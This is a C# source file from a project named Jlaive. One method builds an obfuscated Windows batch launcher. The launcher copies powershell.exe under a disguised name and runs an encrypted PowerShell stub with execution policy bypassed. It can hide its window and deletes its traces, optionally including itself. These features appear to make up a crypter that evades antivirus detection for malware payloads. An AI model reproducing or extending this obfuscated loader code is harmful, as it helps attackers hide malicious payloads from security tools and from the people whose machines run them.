using System;
using System.Text;

using static Jlaive.Utils;

namespace Jlaive
{
    public class FileGen
    {
        public static string CreateBat(byte[] key, byte[] iv, bool usexor, bool hidden, bool selfdelete, Random rng)
        {
            string command = StubGen.CreatePS(key, iv, usexor, rng);
            StringBuilder output = new StringBuilder();
            output.AppendLine("@echo off");

            (string, string) obfuscated = Obfuscator.GenCodeBat(@"copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", rng, 4);
            output.AppendLine(obfuscated.Item1);
            output.AppendLine(obfuscated.Item2 + " \"%~dp0%~nx0.exe\" /y");

            output.AppendLine("cls");
            obfuscated = Obfuscator.GenCodeBat("cd %~dp0", rng, 4);
            output.AppendLine(obfuscated.Item1);
            output.AppendLine(obfuscated.Item2);

            string commandstart = $"-noprofile {(hidden ? "-windowstyle hidden" : string.Empty)} -executionpolicy bypass -command ";
            obfuscated = Obfuscator.GenCodeBat(commandstart, rng, 2);
            output.AppendLine(obfuscated.Item1);
            output.AppendLine("\"%~nx0.exe\" " + obfuscated.Item2 + command);

            output.AppendLine("del \"%~dp0%~nx0.exe\"");
            if (selfdelete) output.AppendLine("(goto) 2>nul & del \"%~f0\"");
            output.AppendLine("exit /b");
            return output.ToString();
        }
    }
}
